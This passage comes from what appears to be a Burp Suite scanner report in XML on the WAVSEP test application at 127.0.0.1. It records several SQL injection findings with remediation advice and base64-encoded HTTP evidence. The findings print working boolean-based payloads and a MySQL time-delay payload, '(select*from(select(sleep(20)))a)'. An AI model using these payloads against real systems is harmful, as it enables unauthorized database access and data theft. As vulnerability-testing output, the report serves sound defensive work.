yOiA/MQ0KDQptc2dJZD0oc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA0ODENCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE3IC0gSW5qZWN0aW9uIGludG8gYSBudW1lcmljIHZhbHVlIGluIGEgc2VhcmNoIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClRoZSBsaXN0IG9mIG1lc3NhZ2VzOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KTXNnSWQKPC9CPgo8L1REPgo8VEQ+CjxCPgpUaXRsZQo8L0I+CjwvVEQ+CjxURD4KPEI+Ck1lc3NhZ2UKPC9CPgo8L1REPgo8L1RSPgo8L1RBQkxFPgoKCjwvYm9keT4KPC9odG1sPg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5290247534521834496</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-WithDifferent200Responses.jsp [minBalanace parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>minBalanace</b> parameter appears to be vulnerable to SQL injection attacks. The payloads <b>32578434 or 2345=02345</b> and <b>32058771 or 6277=6279</b> were each submitted in the minBalanace parameter. These two requests resulted in different responses, indicating that the input is being incorporated into a SQL query in an unsafe way. <br><br>Note that automated difference-based tests for SQL injection flaws can often be unreliable and are prone to false positive results. You should manually review the reported requests and responses to confirm whether a vulnerability is actually present.<br><br> Additionally, the payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the minBalanace parameter. The application took <b>20010</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9MTAwMDAzMjU3ODQzNCUyMG9yJTIwMjM0NSUzZDAyMzQ1]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9MTAwMDAzMjA1ODc3MSUyMG9yJTIwNjI3NyUzZDYyNzk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ0OjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjUNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpObyBNYXRjaC4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTgtSW5qZWN0aW9uSW5DYWxjLU51bWVyaWNXaXRob3V0UXVvdGVzLUJvb2xlYW5FeHBsb2l0LVdpdGhEaWZmZXJlbnQyMDBSZXNwb25zZXMuanNwIEhUVFAvMS4xDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBVYnVudHU7IExpbnV4IHg4Nl82NDsgcnY6MTA4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTA4LjANCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZSwgYnINCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQ29ubmVjdGlvbjogY2xvc2UNCkhvc3Q6IDEyNy4wLjAuMToxODA4MA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQNCkNvbnRlbnQtTGVuZ3RoOiAxNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTE4LUluamVjdGlvbkluQ2FsYy1OdW1lcmljV2l0aG91dFF1b3Rlcy1Cb29sZWFuRXhwbG9pdC1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcA0KQ29va2llOiBKU0VTU0lPTklEPUU0NEFBNTYzQzRFQkU0MEQ3MjY4OTk2NTVCNjBBQjEwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQpTZWMtRmV0Y2gtRGVzdDogZG9jdW1lbnQNClNlYy1GZXRjaC1Nb2RlOiBuYXZpZ2F0ZQ0KU2VjLUZldGNoLVNpdGU6IHNhbWUtb3JpZ2luDQpTZWMtRmV0Y2gtVXNlcjogPzENCg0KbWluQmFsYW5hY2U9KHNlbGVjdCpmcm9tKHNlbGVjdChzbGVlcCgyMCkpKWEp]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzOTINCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE4IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYSBjYWxjdWxhdGlvbiBwYWdlIHdpdGggZGlmZmVyZW50IHZhbGlkIHJlc3BvbnNlcyBhbmQgcXVvdGUgdmFsaWRhdGlvbjwvdGl0bGU+CjwvaGVhZD4KPGJvZHk+CgpTZXZlcmFsIGFjY291bnRzIG1hdGNoIHRoZSBjcml0ZXJpYS4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>437621288086461440</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Valid/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-WithDifferent200Responses.jsp [msgid parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20006</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBWYWxpZC9DYXNlMTktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpY1dpdGhvdXRRdW90ZXMtQ29tbWFuZEluamVjdGlvbi1XaXRoRGlmZmVyZW50MjAwUmVzcG9uc2VzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtMjAwVmFsaWQvQ2FzZTE5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWNXaXRob3V0UXVvdGVzLUNvbW1hbmRJbmplY3Rpb24tV2l0aERpZmZlcmVudDIwMFJlc3BvbnNlcy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD1FNDRBQTU2M0M0RUJFNDBENzI2ODk5NjU1QjYwQUIxMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZ2lkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQzOjA3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjYNCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE5IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBkaWZmZXJlbnQgdmFsaWQgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>5118926410215956480</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-500Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-WithErrors.jsp [orderby parameter]]]></location>
    <severity>High</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
